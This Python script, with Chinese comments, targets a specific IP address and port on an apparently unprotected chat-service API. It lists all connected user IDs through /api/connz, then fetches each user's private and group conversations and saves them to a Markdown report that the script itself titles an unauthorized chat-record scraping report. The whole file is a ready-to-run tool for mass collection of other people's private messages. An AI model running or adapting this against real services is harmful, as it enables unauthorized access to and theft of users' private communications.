import json, datetime, urllib.request, urllib.parse, sys

BASE = "http://43.198.164.35:5300"
TS   = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
OUT  = f"43.198.164.35_聊天记录_{TS}.md"

def get(path):
    with urllib.request.urlopen(BASE + path, timeout=30) as r:
        return json.loads(r.read().decode())

# ---------- 1) 分页拉取 /api/connz，取全部 uid ----------
def take_uid(it):
    if isinstance(it, dict):
        for k in ("uid", "user_id"):
            if it.get(k) is not None: return it[k]
    elif isinstance(it, (str, int)):
        return it
    elif isinstance(it, (list, tuple)):
        for x in it:
            u = take_uid(x)
            if u is not None: return u
    return None

def fetch_all_connz():
    offset = 0
    limit  = 200
    out    = []
    while True:
        q = urllib.parse.urlencode({"offset": offset, "limit": limit})
        d = get(f"/api/connz?{q}")
        arr = d.get("connections") if isinstance(d, dict) else d
        if not isinstance(arr, list): arr = []
        out += arr
        total  = d.get("total", len(out)) if isinstance(d, dict) else len(out)
        offset += len(arr)
        if not arr or offset >= total:
            break
    return out, (d.get("total") if isinstance(d, dict) else None)

conns, total = fetch_all_connz()
uids, seen = [], set()
for it in conns:
    u = take_uid(it)
    if u is not None and u not in seen:
        seen.add(u); uids.append(u)
print(f"[+] connz 返回 total={total}, 共取到 {len(conns)} 条连接, 去重 uid {len(uids)} 个", file=sys.stderr)

# ---------- 2) 递归找会话列表（兼容任意 key） ----------
def find_convs(obj):
    """递归找出所有含 channel_type 的 dict，聚合成列表"""
    res = []
    def walk(o):
        if isinstance(o, list):
            for x in o: walk(x)
        elif isinstance(o, dict):
            if "channel_type" in o:
                res.append(o)
            else:
                for v in o.values(): walk(v)
    walk(obj)
    return res

def js(obj):
    return "```json\n" + json.dumps(obj, ensure_ascii=False, indent=2) + "```"

# ---------- 3) 逐个 uid 拉会话并渲染 ----------
lines = []
lines.append("# 43.198.164.35:5300 未授权聊天记录抓取报告")
lines.append("")
lines.append(f"- 目标: `{BASE}`")
lines.append(f"- 拉取时间: {datetime.datetime.now().isoformat(timespec='seconds')}")
lines.append(f"- uid 总数: **{len(uids)}**")
lines.append("")
lines.append(f"- 私聊会话合计: **(运行后填入)**&#8203;")
lines.append("")
lines.append("> channel_type: 1 = 私聊, 2 = 群聊")
lines.append("")

total_p = total_g = 0
for uid in uids:
    try:
        data = get(f"/api/conversations?uid={uid}")
    except Exception as e:
        data = {"__err__": str(e)}
    convs = find_convs(data)
    private = [c for c in convs if str(c.get("channel_type")) == "1"]
    group   = [c for c in convs if str(c.get("channel_type")) == "2"]
    total_p += len(private); total_g += len(group)

    lines.append(f"## uid: `{uid}`")
    lines.append(f"- 私聊会话: {len(private)}")
    lines.append(f"- 群聊会话: {len(group)}")
    if not convs:
        lines.append("> ⚠️ 未在返回中识别到含 channel_type 的会话，原始响应如下")
        lines.append(js(data))
    if private:
        lines.append(""); lines.append("### 私聊 (channel_type=1)")
        for c in private: lines.append(js(c)); lines.append("")
    if group:
        lines.append(""); lines.append("### 群聊 (channel_type=2)")
        for c in group: lines.append(js(c)); lines.append("")
    lines.append("")
    print(f"[+] uid={uid}  私聊={len(private)} 群聊={len(group)}", file=sys.stderr)

# 回填合计
lines[-8] = f"- 私聊会话合计: **{total_p}**"   # 占位近似，见下方更稳妥写法
# 更稳妥：直接在末尾追加统计
lines.append("---")
lines.append(f"**统计: 共 {len(uids)} 个 uid，私聊 {total_p} 条，群聊 {total_g} 条**")

open(OUT, "w", encoding="utf-8").write("\n".join(lines))
print(f"\n[+] 完成: uid {len(uids)} 个, 私聊 {total_p} / 群聊 {total_g}", file=sys.stderr)
print(f"[+] 已保存到: {OUT}", file=sys.stderr)
